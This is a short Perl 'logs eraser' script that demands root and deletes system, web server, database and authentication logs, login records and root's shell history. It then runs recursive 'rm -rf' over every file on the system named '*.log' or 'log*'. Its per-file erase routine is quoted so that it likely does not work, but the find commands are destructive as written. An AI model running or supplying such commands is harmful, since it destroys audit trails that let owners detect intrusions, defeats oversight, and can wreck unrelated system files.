#!/usr/bin/perl

if($^O eq 'MSWin32') { die("\nScript Work Only on Unix OS"); } else { system('clear'); }
$login = (getpwuid $>);
die "Must run as root" if $login ne 'root';

print q{ 
             _                                                
            | |                                               
            | | ___   __ _ ___    ___ _ __ __ _ ___  ___ _ __ 
            | |/ _ \ / _` / __|  / _ \ '__/ _` / __|/ _ \ '__|
            | | (_) | (_| \__ \ |  __/ | | (_| \__ \  __/ |   
            |_|\___/ \__, |___/  \___|_|  \__,_|___/\___|_|   
                      __/ |                                   
                     |___/                 
};


erase("/var/apache/logs");
erase("/var/apache/log");
erase("/var/log/lastlog");
erase("/var/php/logs/php_error_log");
erase("/var/log/wtmp");
erase("/var/mysql/data/mysql_error.log");
erase("/etc/wtmp");
erase("/var/run/utmp");
erase("/etc/utmp");
erase("/var/log");
erase("/var/logs");
erase("/var/adm");
erase("/usr/local/apache/log");
erase("/usr/local/apache/logs");
erase("/root/.bash_history");
erase("/root/.ksh_history");
erase("/var/log/messages");
erase("/var/log/auth.log");
erase("/var/log/debug");
erase("/var/log/faillog");
erase("/var/log/user.log");
erase("/var/log/apache2/");
erase("/var/log/lighttpd/");
erase("/var/log/system.log");
system("find / -name *.log -exec rm -rf {} \;");
system("find / -name log* -exec rm -rf {} \;");

print "\n   [+] Done !\n";
print "\n  [+] All Logs File Erased Now\n\n";

sub erase {

$logfile = $_[0];
     if(-e "$logfile")
 {
   system 'rm -rf $logfile';
   print"\n [+]$logfile erased !\n";
 }
else
 {
  print "\n [-]$logfile - No such file or directory\n";
 }

}
